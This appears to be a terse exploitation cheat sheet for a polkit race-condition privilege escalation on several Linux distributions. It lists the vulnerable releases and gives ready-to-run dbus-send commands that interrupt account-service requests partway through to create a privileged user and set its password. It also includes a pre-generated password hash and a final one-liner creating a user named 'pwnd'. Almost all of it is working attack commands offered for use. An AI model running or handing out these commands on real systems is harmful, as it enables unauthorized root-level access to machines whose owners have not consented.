- OS Vulnerable : 
    - Red Hat Enterprise Linux 8
    - Fedora 21 (or later)
    - Debian Testing ("Bullseye")
    - Ubuntu 20.04 LTS ("Focal Fossa")
        - polkit version : 0.105-26ubuntu1
        - apt list --installed | grep policykit-1

- Exploitation
    - Generate password
        - openssl passwd -6 'V3r!st0ngp4$&'
        - rkit:$6$I3kWLOT.mxHW8IwK$rdR/MBWC8QVCVFf4ihy65q7TNik4PUivIzgmX1NnFFso1EKnp1T6UIoC6POh9dzefaVmL5aiRl.PcLzAU80/Z.
    - send message to the dbus and kill it directly to not allow for the check
    - exploit : 
        - check the time needed for one request : 
            - instruction : run the command periodically before getting a stable time
            - command : time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:<USERNAME> string:"" int32:1
        - run the desired command and kill it in about half of the time needed for the message to run correctly : 
            - instruction : if the time needed for one request is 10ms, the time to kill the code will be about 5ms
            - code : 
                - create a user : dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:<USERNAME> string:"" int32:1 & sleep 0.002s; kill $!
                - set password to the fresh user : dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User<UID> org.freedesktop.Accounts.User.SetPassword string:'<PASSWORD-HASH>' string:'' & sleep 0.001s; kill $!
                


dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:pwnd string:"" int32:1 & sleep 0.0005s; kill $!